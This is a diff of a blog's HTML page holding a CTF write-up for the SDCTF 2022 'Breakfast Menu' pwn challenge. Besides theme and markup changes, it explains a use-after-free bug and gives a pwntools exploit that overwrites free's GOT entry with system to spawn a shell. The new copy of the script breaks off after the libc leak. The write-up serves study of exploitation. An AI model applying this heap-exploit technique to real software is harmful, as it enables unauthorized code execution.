@@ -15,26 +15,25 @@
 
 
 
-<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css" integrity="sha256-XOqroi11tY4EFQMR9ZYwZWKj5ZXiftSx36RRuC3anlA=" crossorigin="anonymous">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
 
-<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+<script class="next-config" data-name="main" type="application/json">{"hostname":"www.aynakeya.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.25.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":true,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":null,"post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInDown","sidebar":"fadeInDown"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"},"path":"/search.xml","localsearch":{"enable":true,"top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>
 
-    <meta name="description" content="0x0 IntroductionMedium I’m awfully hungry, with all these options to choose from, what should I order? Connect nc breakfast.sdc.tf 1337 By green beans files: BreakfastMenu 0x1 Mitigation12345Arch:">
+    <meta name="description" content="0x0 IntroductionMedium I’m awfully hungry, with all these options to choose from, what should I order? Connect nc breakfast.sdc.tf 1337 By green beans files: BreakfastMenu 0x1 MitigationArch:     amd6">
 <meta property="og:type" content="website">
 <meta property="og:title" content="[Pwn] Breakfast Menu [SDCTF 2022]">
 <meta property="og:url" content="http://www.aynakeya.com/ctf-writeup/2022/sdctf/pwn/breakfast-menu/index.html">
 <meta property="og:site_name" content="Aynakeya&#39;s Blog">
-<meta property="og:description" content="0x0 IntroductionMedium I’m awfully hungry, with all these options to choose from, what should I order? Connect nc breakfast.sdc.tf 1337 By green beans files: BreakfastMenu 0x1 Mitigation12345Arch:">
+<meta property="og:description" content="0x0 IntroductionMedium I’m awfully hungry, with all these options to choose from, what should I order? Connect nc breakfast.sdc.tf 1337 By green beans files: BreakfastMenu 0x1 MitigationArch:     amd6">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2022-05-10T01:51:00.000Z">
-<meta property="article:modified_time" content="2022-05-10T01:51:00.000Z">
+<meta property="article:published_time" content="2022-05-09T10:51:00.000Z">
+<meta property="article:modified_time" content="2022-05-09T10:51:00.000Z">
 <meta property="article:author" content="Aynakeya">
 <meta name="twitter:card" content="summary">
 
 
 <link rel="canonical" href="http://www.aynakeya.com/ctf-writeup/2022/sdctf/pwn/breakfast-menu/">
-
 
 
 <script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":false,"lang":"en","comments":true,"permalink":"http://www.aynakeya.com/ctf-writeup/2022/sdctf/pwn/breakfast-menu/index.html","path":"ctf-writeup/2022/sdctf/pwn/breakfast-menu/index.html","title":"[Pwn] Breakfast Menu [SDCTF 2022]"}</script>
@@ -46,6 +45,27 @@
 
 
 
+
+
+
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/lozad.js/1.16.0/lozad.min.js" integrity="sha256-mOFREFhqmHeQbXpK2lp4nA3qooVgACfh88fpJftLBbc=" crossorigin="anonymous" defer></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/pangu/7.2.0/pangu.umd.js" integrity="sha256-JnmRRnJK7DC6RQJbAJb6AXOM9OmWzS6z8eYultk/48Y=" crossorigin="anonymous" defer></script>
+<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
+<script src="/js/third-party/search/local-search.js" defer></script>
+
+
+
+
+
+
+
+  
 
 
 
@@ -105,25 +125,25 @@
 
 
   <div class="search-pop-overlay">
-    <div class="popup search-popup"><div class="search-header">
-  <span class="search-icon">
-    <i class="fa fa-search"></i>
-  </span>
-  <div class="search-input-container">
-    <input autocomplete="off" autocapitalize="off" maxlength="80"
-           placeholder="Searching..." spellcheck="false"
-           type="search" class="search-input">
-  </div>
-  <span class="popup-btn-close" role="button">
-    <i class="fa fa-times-circle"></i>
-  </span>
-</div>
-<div class="search-result-container no-result">
-  <div class="search-result-icon">
-    <i class="fa fa-spinner fa-pulse fa-5x"></i>
-  </div>
-</div>
-
+    <div class="popup search-popup">
+      <div class="search-header">
+        <span class="search-icon">
+          <i class="fa fa-search"></i>
+        </span>
+        <div class="search-input-container">
+          <input autocomplete="off" autocapitalize="off" maxlength="80"
+                placeholder="Searching..." spellcheck="false"
+                type="search" class="search-input">
+        </div>
+        <span class="popup-btn-close" role="button">
+          <i class="fa fa-times-circle"></i>
+        </span>
+      </div>
+      <div class="search-result-container">
+        <div class="search-result-icon">
+          <i class="fa fa-spinner fa-pulse fa-5x"></i>
+        </div>
+      </div>
     </div>
   </div>
 
@@ -160,7 +180,7 @@
   <nav class="site-state">
       <div class="site-state-item site-state-posts">
         <a href="/archives">
-          <span class="site-state-item-count">119</span>
+          <span class="site-state-item-count">120</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
@@ -171,7 +191,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags">
-        <span class="site-state-item-count">96</span>
+        <span class="site-state-item-count">98</span>
         <span class="site-state-item-name">tags</span></a>
       </div>
   </nav>
@@ -231,7 +251,11 @@
 <p>nc breakfast.sdc.tf 1337</p>
 <p>By green beans</p>
 <p>files: <a href="BreakfastMenu">BreakfastMenu</a></p>
-<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+<h1 id="0x1-Mitigation"><a href="#0x1-Mitigation" class="headerlink" title="0x1 Mitigation"></a>0x1 Mitigation</h1><pre class="line-numbers language-none"><code class="language-none">Arch:     amd64-64-little
+RELRO:    Partial RELRO
+Stack:    No canary found
+NX:       NX enabled
+PIE:      No PIE (0x400000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
 
 <h1 id="0x2-Vulnerability"><a href="#0x2-Vulnerability" class="headerlink" title="0x2 Vulnerability"></a>0x2 Vulnerability</h1><p>In short, binary have a Use-After-Free (UAF) vulnerability. Allow us to edit the heap after we free the heap. </p>
 <p>Moreover, the dangling pointers are global variable. Therefore we can utilze the single linked list in heap and do a write on the address we want.</p>
@@ -248,7 +272,105 @@
 <li>edit obj.orders[3] to got.free, then edit obj.orders[0], replace <code>free</code> with <code>system</code></li>
 <li>free(obj.orders[2]), this will call <code>system(&quot;/bin/sh&quot;)</code> and give us a shell.</li>
 </ol>
-<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">exe = ELF(<span class="string">&quot;BreakfastMenu_patched&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line">ld = ELF(<span class="string">&quot;./ld-2.27.so&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.binary = exe</span><br><span class="line"><span class="comment"># context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">log_print</span>(<span class="params">*msg</span>):</span><br><span class="line">    log.info(<span class="string">&quot; &quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,msg)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.LOCAL:</span><br><span class="line">        r = process([exe.path])</span><br><span class="line">        <span class="keyword">if</span> args.R2:</span><br><span class="line">            <span class="built_in">input</span>(<span class="string">&quot;Wait r2 attach&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        r = remote(<span class="string">&quot;breakfast.sdc.tf&quot;</span>, <span class="number">1337</span>)</span><br><span class="line">    <span class="keyword">return</span> r</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io = start()</span><br><span class="line"></span><br><span class="line"><span class="comment"># make one heap pointer point to obj.orders</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;remove\n&quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;remove\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;got.free, got.puts&quot;</span>,<span class="built_in">hex</span>(exe.got[<span class="string">&quot;free&quot;</span>]))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([exe.symbols[<span class="string">&quot;orders&quot;</span>]]))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># obj.orders[0] = exe.got[&quot;free&quot;]</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># obj.orders[0] = exe.got[&quot;free&quot;]</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([exe.got[<span class="string">&quot;free&quot;</span>]]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># exe.got[&quot;free&quot;] = exe.sym[&quot;puts&quot;]</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([<span class="string">b&#x27;AAAAA\x00&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([<span class="string">b&#x27;AAAA\x00&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([exe.sym[<span class="string">&quot;puts&quot;</span>]]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># obj.orders[0] = exe.got[&quot;printf&quot;]</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([exe.got[<span class="string">&quot;printf&quot;</span>]]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># free(obj.orders[0]) =&gt; puts(obj.orders[0])</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;remove\n&quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">libc.address = <span class="built_in">int</span>.from_bytes(io.recvuntil(<span class="string">b&#x27;\n1. &#x27;</span>,drop=<span class="literal">True</span>),<span class="string">&quot;little&quot;</span>) - libc.sym[<span class="string">&quot;printf&quot;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc leak&quot;</span>,<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment"># obj.orders[0] = exe.got[&quot;free&quot;]</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([exe.got[<span class="string">&quot;free&quot;</span>]]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># exe.got[&quot;free&quot;] = libc.sym[&quot;system&quot;]</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;modify\n&quot;</span>,<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;order?\n&quot;</span>,flat([libc.sym[<span class="string">&quot;system&quot;</span>]]))</span><br><span class="line"></span><br><span class="line"><span class="comment"># free(obj.orders[2]) =&gt; system(&quot;/bin/sh&quot;)</span></span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;leave\n&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">io.sendlineafter(<span class="string">b&quot;remove\n&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h1 id="0x3-Exploit"><a href="#0x3-Exploit" class="headerlink" title="0x3 Exploit"></a>0x3 Exploit</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+exe <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"BreakfastMenu_patched"</span><span class="token punctuation">)</span>
+libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"libc.so.6"</span><span class="token punctuation">)</span>
+ld <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./ld-2.27.so"</span><span class="token punctuation">)</span>
+
+context<span class="token punctuation">.</span>binary <span class="token operator">=</span> exe
+<span class="token comment"># context.log_level = 'DEBUG'</span>
+
+<span class="token keyword">def</span> <span class="token function">log_print</span><span class="token punctuation">(</span><span class="token operator">*</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>
+    log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">" "</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">,</span>msg<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token keyword">def</span> <span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> args<span class="token punctuation">.</span>LOCAL<span class="token punctuation">:</span>
+        r <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token punctuation">[</span>exe<span class="token punctuation">.</span>path<span class="token punctuation">]</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> args<span class="token punctuation">.</span>R2<span class="token punctuation">:</span>
+            <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">"Wait r2 attach"</span><span class="token punctuation">)</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        r <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"breakfast.sdc.tf"</span><span class="token punctuation">,</span> <span class="token number">1337</span><span class="token punctuation">)</span>
+    <span class="token keyword">return</span> r
+
+
+io <span class="token operator">=</span> start<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+<span class="token comment"># make one heap pointer point to obj.orders</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"remove\n"</span><span class="token punctuation">,</span><span class="token string">b'0'</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"remove\n"</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+
+<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"got.free, got.puts"</span><span class="token punctuation">,</span><span class="token builtin">hex</span><span class="token punctuation">(</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"free"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"modify\n"</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"order?\n"</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>exe<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"orders"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'1'</span><span class="token punctuation">)</span>
+
+<span class="token comment"># obj.orders[0] = exe.got["free"]</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"modify\n"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"order?\n"</span><span class="token punctuation">,</span><span class="token string">b"/bin/sh\x00"</span><span class="token punctuation">)</span>
+
+<span class="token comment"># obj.orders[0] = exe.got["free"]</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"modify\n"</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"order?\n"</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"free"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># exe.got["free"] = exe.sym["puts"]</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"modify\n"</span><span class="token punctuation">,</span><span class="token string">b'0'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"order?\n"</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'AAAAA\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"modify\n"</span><span class="token punctuation">,</span><span class="token string">b'0'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"order?\n"</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">b'AAAA\x00'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"modify\n"</span><span class="token punctuation">,</span><span class="token string">b'0'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"order?\n"</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>exe<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"puts"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># obj.orders[0] = exe.got["printf"]</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"modify\n"</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"order?\n"</span><span class="token punctuation">,</span>flat<span class="token punctuation">(</span><span class="token punctuation">[</span>exe<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"printf"</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+<span class="token comment"># free(obj.orders[0]) => puts(obj.orders[0])</span>
+
+io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">b"leave\n"</span><span class="token punctuation">,</span><span class="token string">b'3'</span><span class="token punctuation">)</span>
